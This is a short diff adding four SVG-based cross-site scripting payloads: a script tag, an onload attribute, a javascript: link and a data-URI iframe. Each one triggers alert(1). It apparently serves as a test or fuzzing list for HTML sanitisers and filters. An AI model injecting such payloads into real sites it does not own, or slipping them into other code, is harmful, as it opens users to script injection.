@@ -1,0 +1,4 @@
+<svg><script>alert(1)</script></svg>
+<svg/onload=alert(1)>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<iframe src='data:text/html,<svg onload=alert(1)>'></iframe>
